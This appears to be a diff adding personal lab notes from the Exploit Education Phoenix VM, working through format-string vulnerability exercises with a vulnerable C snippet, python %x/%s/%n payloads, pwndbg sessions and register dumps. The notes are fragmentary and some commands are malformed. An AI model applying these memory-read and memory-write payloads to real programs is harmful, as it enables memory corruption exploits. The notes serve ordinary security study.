@@ -1,0 +1,86 @@
+Run script: 
+D:
+cd D:\Downloads\exploit-education-phoenix-amd64-v1.0.0-alpha-3\exploit-education-phoenix-amd64
+powershell.exe -ExecutionPolicy Bypass -File boot-exploit-education-phoenix-amd64.ps1
+
+Format 1:
+user@phoenix-amd64:~$ python -c "print '%x'*15 " | /opt/phoenix/amd64/format-one
+Welcome to phoenix/format-one, brought to you by https://exploit.education
+Uh oh, 'changeme' is not the magic value, it is 0x65666666
+
+
+Learning format-string vulnerability:
+
+Step 1: Leaking string!
+#include  <stdio.h> 
+void main(int argc, char **argv)
+{
+	//try to print this variable!
+	char * printMe = "PlsPrintMe";
+
+	printf(argv[1]);
+
+	printf("\n");
+
+}
+
+r `python -c "print '%08x_%08x_%08x_%08x_%08x_%08x_%s\n'  "`
+
+00000001_56559000_565561c0_00000002_ffffd6a4_ffffd6b0_PlsPrintMe
+
+Step 2: Manipulate to print that address(?)
+
+r <<< $(python -c "print '\xCC'*4 + '%x'*5 ")
+
+search -t bytes "PlsPrintMe"
+pwndbg> search -t bytes "PlsPrintMe"
+printf          0x56557008 'PlsPrintMe'
+printf          0x56558008 'PlsPrintMe'
+
+r <<< $(python -c "print '\x08\x70\x55\x56' + '%x'*5 +'%s'")
+
+pwndbg> c
+Continuing.
+pUVffffd5a8f7fcd410565561c001PlsPrintMe[Inferior 1 (process 57320) exited normally]
+r <<< $(python -c "print '\x08\x70\x55\x56' + '%x'*5 +'%s'")
+
+0x7f ff ff ff e4 c0
+
+
+e494
+e4980
+e49c01
+
+
+
+Format-two:
+r `python -c "print '%08x_'*6 + '%s'  "`
+
+ (%rdi, %rsi, %rdx, %rcx, %r8 and %r9)
+rsi		 rdx	  rcx	   r8		r9		 rsp	  rsp+8 --> stack value string
+00000000_000000e0_00000000_ffffe560_ffffe4ff_ffffe540_%08x_%08x_%08x_%08x_%08x_%08x_%s
+
+$rax   : 0x0
+$rbx   : 0x00007fffffffe698  →  0x00007fffffffe895  →  "/opt/phoenix/amd64/format-two"
+$rcx   : 0x0
+$rdx   : 0xe0
+$rsp   : 0x00007fffffffe510  →  0x00007fffffffe540  →  "%08x_%08x_%08x_%08x_%08x_%08x_%s"
+$rbp   : 0x00007fffffffe520  →  0x00007fffffffe640  →  0x0000000000000002
+$rsi   : 0x0
+$rdi   : 0x00007fffffffe540  →  "%08x_%08x_%08x_%08x_%08x_%08x_%s"
+$rip   : 0x0000000000400685  →  <bounce+24> call 0x4004a0 <printf@plt>
+$r8    : 0x00007fffffffe560  →  0x0000000000000000
+$r9    : 0x00007fffffffe4ff  →  0x007ffff7ffb3000a
+$r10   : 0x1
+$r11   : 0x206
+$r12   : 0x00007fffffffe6b0  →  0x00007fffffffe8d4  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
+$r13   : 0x000000000040068d  →  <main+0> push rbp
+$r14   : 0x0
+$r15   : 0x0
+
+changeme is at 0x600af0
+
+With this payload I will overwrite 0xffffd614 with 0x1e
+r <<< $(python -c "print '\x14\xd6\xff\xff' + '%x'*5 +'%n'")
+
+r `python -c "print ' '%08x_'*6 + '%n'  "`
